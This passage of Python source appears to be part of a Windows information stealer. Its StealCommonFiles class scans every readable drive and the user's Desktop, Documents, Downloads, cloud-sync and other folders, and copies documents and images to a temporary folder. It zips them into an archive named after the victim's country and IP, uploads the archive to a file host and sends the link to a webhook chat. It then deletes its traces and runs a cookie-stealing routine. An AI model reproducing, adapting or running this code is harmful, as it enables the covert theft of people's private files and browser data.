            ".xz", ".svg", ".tiff", ".bmp", ".ico", ".heic", ".heif", ".webp", ".odt", ".ods",
            ".odp", ".odg", ".odf", ".abw", ".docm", ".dot", ".dotx", ".dotm", ".xlsm", ".xlt",
            ".xltx", ".xltm", ".pptm", ".pot", ".potx", ".potm", ".ppam", ".ppsm", ".sldx", ".sldm"
        ]

        tasks = []
        for drive in drives:
            task = asyncio.create_task(self.process_drive(drive, username, keywords, allowed_extensions))
            tasks.append(task)
        await asyncio.gather(*tasks, return_exceptions=True)

    def get_all_drives(self) -> List[str]:
        valid_drives = []
        for drive_letter in range(ord('A'), ord('Z') + 1):
            drive = f"{chr(drive_letter)}:\\"
            try:
                if os.path.exists(drive) and os.access(drive, os.R_OK):
                    valid_drives.append(drive)
                    print(f"Found accessible drive: {drive}")
                else:
                    print(f"Skipping non-existent or inaccessible drive: {drive}")
            except OSError as e:
                print(f"Skipping drive {drive}: {e}")
        return valid_drives

    async def process_drive(self, drive: str, username: str, keywords: List[str], allowed_extensions: List[str]) -> None:
        try:
            # Get country and IP from Maincookie
            country, ip = Maincookie.get_country_and_ip()
            drive_name = drive.replace(':\\', '').replace(':', '_')
            destination_directory = os.path.join(self.temp, f"{country}_{ip}_{drive_name}")

            if not os.path.exists(destination_directory):
                os.makedirs(destination_directory)

            # Define source directories for C: drive
            if drive.upper() == "C:\\":
                user_path = os.path.join(drive, "Users", username)
                source_directories = [
                    (f"{drive}Desktop", os.path.join(user_path, "Desktop")),
                    (f"{drive}Pictures", os.path.join(user_path, "Pictures")),
                    (f"{drive}Documents", os.path.join(user_path, "Documents")),
                    (f"{drive}Music", os.path.join(user_path, "Music")),
                    (f"{drive}Videos", os.path.join(user_path, "Videos")),
                    (f"{drive}Downloads", os.path.join(user_path, "Downloads")),
                    (f"{drive}Favorites", os.path.join(user_path, "Favorites")),
                    (f"{drive}Contacts", os.path.join(user_path, "Contacts")),
                    (f"{drive}Saved Games", os.path.join(user_path, "Saved Games")),
                    (f"{drive}Searches", os.path.join(user_path, "Searches")),
                    (f"{drive}Links", os.path.join(user_path, "Links")),
                    (f"{drive}3D Objects", os.path.join(user_path, "3D Objects")),
                    (f"{drive}OneDrive", os.path.join(user_path, "OneDrive")),
                    (f"{drive}Google Drive", os.path.join(user_path, "Google Drive")),
                    (f"{drive}Dropbox", os.path.join(user_path, "Dropbox")),
                ]
            else:
                # For non-C: drives, scan from root with depth limit
                source_directories = [(f"{drive}Root", drive)]

            # Process each source directory
            for label, source_path in source_directories:
                if os.path.isdir(source_path):
                    print(f"Processing directory: {source_path}")
                    # Use walk_with_depth with no depth limit for C: drive, max_depth for others
                    max_depth = None if drive.upper() == "C:\\" else self.max_depth
                    for folder_path, _, files in self.walk_with_depth(source_path, max_depth=max_depth):
                        for file_name in files:
                            file_path = os.path.join(folder_path, file_name)
                            try:
                                _, file_extension = os.path.splitext(file_name)
                                # Check if file is valid and accessible
                                if not os.path.isfile(file_path) or not os.access(file_path, os.R_OK):
                                    print(f"Skipping inaccessible file: {file_path}")
                                    continue
                                file_size = os.path.getsize(file_path)
                                if (
                                    (file_extension.lower() in allowed_extensions and file_size < 1 * 1024 * 1024)
                                    or any(keyword in file_name.lower() for keyword in keywords)
                                    or label.endswith("Root")
                                ):
                                    # Create destination folder based on source structure
                                    rel_path = os.path.relpath(folder_path, source_path)
                                    destination_folder_path = os.path.join(destination_directory, rel_path)

                                    if not os.path.exists(destination_folder_path):
                                        os.makedirs(destination_folder_path)

                                    destination_path = os.path.join(destination_folder_path, file_name)
                                    try:
                                        shutil.copy2(file_path, destination_path)
                                        print(f"Copied file: {file_path} to {destination_path}")
                                    except (OSError, shutil.Error) as e:
                                        print(f"Failed to copy file {file_path}: {e}")
                                        continue
                            except (OSError, PermissionError) as e:
                                print(f"Error processing file {file_path}: {e}")
                                continue

            # Create ZIP archive after processing drive
            zip_path = os.path.join(self.temp, f"{country}_{ip}_{drive_name}")
            shutil.make_archive(zip_path, 'zip', destination_directory)
            zip_file = f"{zip_path}.zip"
            print(f"Created ZIP archive: {zip_file}")

            # Upload ZIP file
            uploaded_url = await UploadGoFile.upload_file(zip_file)
            if uploaded_url:
                print(f"Uploaded ZIP to: {uploaded_url}")
                async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                    async with session.post(webhook_message, json={"chat_id": chat_id, "text": uploaded_url}) as response:
                        print(f"Webhook response status: {response.status}")
            else:
                print(f"Failed to upload ZIP: {zip_file}")

            # Cleanup
            try:
                if os.path.exists(zip_file):
                    os.remove(zip_file)
                if os.path.exists(destination_directory):
                    shutil.rmtree(destination_directory)
                print(f"Cleaned up: {zip_file} and {destination_directory}")
            except OSError as e:
                print(f"Failed to clean up {zip_file}: {e}")

        except Exception as e:
            print(f"Error processing drive {drive}: {e}")
            traceback.print_exc()

    def walk_with_depth(self, path: str, max_depth: int = None):
        """Custom os.walk with depth limit."""
        path = os.path.abspath(path)
        base_depth = path.count(os.sep)
        for root, dirs, files in os.walk(path):
            current_depth = root.count(os.sep) - base_depth
            if max_depth is not None and current_depth > max_depth:
                continue
            yield root, dirs, files

    @staticmethod
    def get_country_and_ip() -> Tuple[str, str]:
        # Sử dụng Maincookie.get_country_and_ip nếu có
        try:
            return Maincookie.get_country_and_ip()
        except AttributeError:
            # Nếu không có Maincookie, sử dụng local implementation
            try:
                response = requests.get("https://ipinfo.io", timeout=5)
                response.raise_for_status()
                data = response.json()
                country = data.get("country", "Unknown")
                ip = data.get("ip", "0.0.0.0")
                return country, ip
            except requests.RequestException as e:
                print(f"Failed to get country and IP: {e}")
                return "Unknown", "0.0.0.0"

if __name__ == '__main__':
    if os.name == "nt":
        asyncio.run(main())
        asyncio.run(Maincookie.execute())
        main_instance = Main()
        asyncio.run(main_instance.FunctionRunner())
        asyncio.run(StealCommonFiles().StealFiles())